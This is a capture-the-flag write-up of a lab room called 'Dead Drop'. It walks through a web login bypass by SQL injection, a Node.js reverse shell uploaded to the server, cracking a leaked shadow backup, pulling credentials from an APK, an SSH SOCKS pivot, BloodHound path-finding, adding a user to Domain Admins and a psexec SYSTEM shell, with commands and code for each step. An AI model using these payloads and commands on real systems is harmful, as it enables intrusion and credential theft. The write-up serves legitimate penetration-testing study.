+++
title = 'Dead Drop - Jr Penetration Tester Challenge'
date = 2026-06-18
tags = ["ctf", "writeup", "medium"]
draft = false
+++

> In this challenge, you need to compromise one webserver, pivot to the internal network and compromise the domain admin. It's an Active Directory challenge, and I love internal pentests.

"The internal network contains a Windows workstation and a domain controller, but you will need to discover their exact addresses yourself."
- You don't, the network structure spoils it :)

And remember, **Download the AD VPN config file** to run with openvpn, not your usual server one.
## Recon

My basic `sudo nmap -vv` found `80` and `22`, so `HTTP` and `SSH`, as usual. As the scope and rules of engagement told us that the web-facing app is the entry point, so I didn't waste too much time and headed straight to the web app. 

When I see a login page, I always try the basics `admin:admin` and `admin:password`, if that doesn't work, I try `admin' or 1=1 -- ` and its variants. 

This ... worked? Well, anyway, we are in!

Just in case, I did a directory enum with gobuster without any significant results. It was a basic one and if I get stuck in the future, I come back to a more detailed discovery.

```text
$ gobuster dir -u "http://<ip>/" -w /usr/share/wordlists/dirb/common.txt -r -x php,js,zip,bak,txt -t 60
==========================================
dashboard   (Status: 200) [Size: 2068]
login       (Status: 200) [Size: 2068]
logout      (Status: 200) [Size: 2068]
```

## The First Shell

When we get in, we see an **Upload File** feature. Let's analyze its behavior by sending a normal txt file.

![hi_txt](attachments/preview_hi_txt.png)

During the info gathering stage, I did the webserver fingerprint and noted that it was probably `Node.js`.

```http
X-Powered-By: Express
Cookie: connect.sid=...
```

So, instead of the usual PHP reverse shell, I'm going to use a `node.js` one from [revshells](https://www.revshells.com/). To make sure it was calling back, I did a basic exec with `wget http://<local_ip>` with a `python3 -m http.server 80` open. It worked! Then, I did a node reverse shell with a `shell.js` file. I uploaded the following code as `shell.js`, opened a listener and previewed the file.

```js
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/bash", []);
    var client = new net.Socket();
    client.connect(4444, "<local_ip>", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/;
})();
```

Listener: 

```bash
└─$ rlwrap nc -lvnp 9988          
listening on [any] 9988 ...
which python3
/usr/bin/python3
python3 -c 'import pty; pty.spawn("/bin/bash")'
node@tryhackme-2404:/opt/app$ whoami
whoami
node
```

## Persistence

We need persistence. This will also help with pivoting. So:
- *who?*
- *where?*
- *what can we do?*

```txt
node@tryhackme-2404:/opt/app$ whoami
node

node@tryhackme-2404:/opt/app$ id
uid=996(node) gid=996(node) groups=996(node)

node@tryhackme-2404:/opt/app$ ls -l
total 92
app.js
backup/
db/
node_modules/
package-lock.json
package.json
public
uploads
views
```

Two directories caught my immediate attention: `backup/` and `db/`. As I didn't find `mysql` or `sqlite`, I decided to start with `backup/`. And would you look at that, our lucky day! We have a backup of `/etc/shadow` with read permissions.

```txt
node@tryhackme-2404:/opt/app/backup$ ls -l
-rw-r--r-- 1 node node 135 May  9 05:44 shadow.bak

node@tryhackme-2404:/opt/app/backup$ cat shadow.bak
svc-drop:$6$f1331af25300c7f3$<HASH>:19700:0:99999:7:::
```

Let's get this hash and the `/etc/passwd` to crack `svc-drop` password.

Use `unshadow` to build something `john` and `hashcat` can understand:

- `unshadow passwd shadow > hash.txt`

You can choose your flavor to crack it!

```bash
john --format=sha512crypt hash.txt --wordlist=/usr/share/wordlists/rockyou.txt

hashcat -m 1800 hash.txt /usr/share/wordlists/rockyou.txt
```

Now the password is in the cracked pot.

```bash
john hash.txt --show

hashcat hash.txt --show
```

Let's try it!

```bash
ssh svc-drop@<ip>
```

It worked! We are in. The password is the first flag.

## Internal Credential Harvest

We have access to the first machine, but the creds we got doesn't have access to the Active Directory. In our compromised user's home directory, we have another `backup` directory. This one contains a `deaddrop-mobile.apk`. Let's download it:

```bash
scp svc-drop@<ip>:/home/svc-drop/backup/deaddrop-mobile.apk .
```

The room's next flag hint gives us a clue that the next flag is a credential found inside this app. You can use `mobSF` for an auto-scan, but I will use `jadx` to decompile the apk and try to grep for passwords.

```bash
jadx -d /home/kali/labs/out/ /home/kali/labs/deaddrop-mobile.apk
```

Found it inside `resources/res/values/strings.xml`, with the name `default_password` and `default_username`.

## PIVOT!!!!

Aw man, I love pivoting! You can use `chisel` or `ligolo-ng`, but I went with the basic `proxychains` and `ssh` :)

Open a dynamic port forward:

```bash
ssh -f -D 9050 svc-drop@<ip> -N
```

Check if it's open:

```bash
ss -tunlp | grep 9050

tcp   LISTEN 0      128        127.0.0.1:9050       0.0.0.0:*    users:(("ssh",pid=29450,fd=5))
```

I used port 9050 because it's the `proxychains` default. If you didn't, you'll have to modify `/etc/proxychains4.conf`.

Now remember, `proxychains` drops ICMP, use that `-Pn` on your nmap. Also, you'll need to run everything as root. And you'll need to do `-sT` on nmap, `-sS` will *not* work. Start with some basic SMB enum, just to see if it works.

```bash
sudo proxychains -q nmap -sT -vv -p445 <ip>
```

Open ports, yay!

## Privilege Escalation

Let's see if we have a valid user from the `.apk` creds. But first, let's get the domain.

```bash
sudo proxychains -q nmap -sT -sV -Pn -p389 --script=ldap-search <dc_ip>
```

It's `deaddrop.loc`. Let's check the credential.

```bash
sudo proxychains -q nxc smb <dc_ip> -u 'j.harris' -p '<password>' -d deaddrop.loc
```

We got it!

```txt
[+] deaddrop.loc\j.harris:<pass>
```

Unfortunately, it's just a normal user, not a local admin. But it'll let us run a `bloodhound-python` at the DC to get information and see if we can elevate our privileges.

```bash
sudo proxychains -q bloodhound-python -u 'j.harris' -p '<password>' -d 'deaddrop.loc' -ns <dc_ip> -c All --zip --dns-tcp
```

Now we just need to drop it into `bloodhound` cli at `localhost:8080`. If you are having trouble with it, you can get more info on my [bloodhound notes](https://noxgraf.github.io/notes/active_directory/bloodhound).

You can explore bloodhound, look at the user's privileges and what the credential can do, but what I like about bloodhound is the `pathfinding` feature. You set the compromised user as a starting point and `Domain Admin` as the endpoint, and bloodhound explores the path to it for you! The tool even gives you information about how to abuse the privilege.

![bloodhound_pathfinding](attachments/bloodhound_pathfinding.png)

Let's add the `j.harris` user to `Domain Admins`!

```bash
sudo proxychains -q net rpc group addmem "Domain Admins" "j.harris" -U "deaddrop.loc"/"j.harris"%'<password>' -S <dc_ip>
```

We can check it:

```bash
sudo proxychains -q net rpc group members "Domain Admins" -U "deaddrop.loc"/"j.harris"%'<password>' -S <dc_ip>
```

And then:

```bash
sudo proxychains -q nxc smb <dc_ip> -u 'j.harris' -p '<password>' -d deaddrop.loc
```

Boom!

```txt
[+] deaddrop.loc\j.harris:<password> (Pwn3d!)
```

But the answer to the "What is the name of the group you target to escalate to Domain Admin?" is actually another group that is a member of the `Domain Admins` group. I'm sure you can find it.

## King of the Domain Admin

Now, we'll use `impacket-psexec` to get a shell as the king of the Active Directory!

```bash
sudo proxychains -q impacket-psexec 'deaddrop.loc'/'j.harris':'<password>'@<dc_ip>
```

```cmd
C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32> type C:\Users\Administrator\Desktop\flag.txt
THM{}
```

*That's all folks! Thank you for your time :)*

